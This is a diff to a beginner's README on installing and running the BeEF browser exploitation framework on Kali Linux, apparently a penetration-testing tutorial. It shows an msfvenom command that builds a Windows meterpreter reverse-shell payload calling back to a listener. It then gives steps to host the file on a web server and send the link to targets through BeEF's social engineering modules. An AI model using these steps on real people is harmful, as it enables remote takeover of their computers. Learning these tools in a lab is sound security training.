@@ -76,10 +76,23 @@ BeEF (**Browser Exploitation Framework**) is a penetration testing tool that foc
 
 ## ⚙️ Installing BeEF on Kali Linux
 
-### Step 1: Check if Installed
+### Step 1: Check if Install
 ```bash
 beef-xss
 ```
+If it starts : you’re good! Jump to “Running BeEF”.
+If command not found, install it.
+Install it from the kali repository:
+Use /root command  in command prompt/Terminal 
+```bash
+$ Sudo su
+```
+Or open root command prompt/Terminal 
+After to use the installation command 
+```bash
+$ Sudo apt install beef-xss -y
+```
+This installs the latest stable version of BeEF on Kali Linux.
 
 <img width="1324" height="712" alt="Screenshot 2025-09-04 184325" src="https://github.com/user-attachments/assets/70847c50-60ff-4c99-a644-a10a563e2d42" />
 
@@ -103,7 +116,11 @@ Open in browser:
 http://localhost:3000/ui/panel
 
 Default credentials:
+Running BeEF-XSS
+ To change the password to BeEF-XSS. To enter the command and change because of to secured the BeEF and also prepare for the attacks.
 ```bash
+$ nano /etc/beef-xss/config.yaml
+
 Username: beef  
 Password: beef
 ```
@@ -137,6 +154,11 @@ Launch social engineering attacks
 
 # Sample Payload with Metasploit (msfvenom)
 ### Step 1: Create Payload
+
+<img width="954" height="1014" alt="Screenshot 2025-09-13 125820" src="https://github.com/user-attachments/assets/fd9fddc0-3733-4136-9374-d7eb4fa83c2b" />
+<img width="949" height="516" alt="Screenshot 2025-09-13 130038" src="https://github.com/user-attachments/assets/6c6d63e8-cda0-4b4b-bef0-bdd04135f959" />
+
+
 ```bash
 msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.1.10 lport=4444 -f exe > payload.exe
 ```
@@ -146,15 +168,3 @@ mv payload.exe /var/www/html/
 ```
 
 Send the link using BeEF’s social engineering modules.
-
-# Folder Structure
-```bash
-BeEF-XSS/
-├── setup/
-│   └── virtualbox_guide.md
-├── payloads/
-│   └── xss_beef_hook.html
-├── screenshots/
-│   └── panel.png
-├── README.md
-```
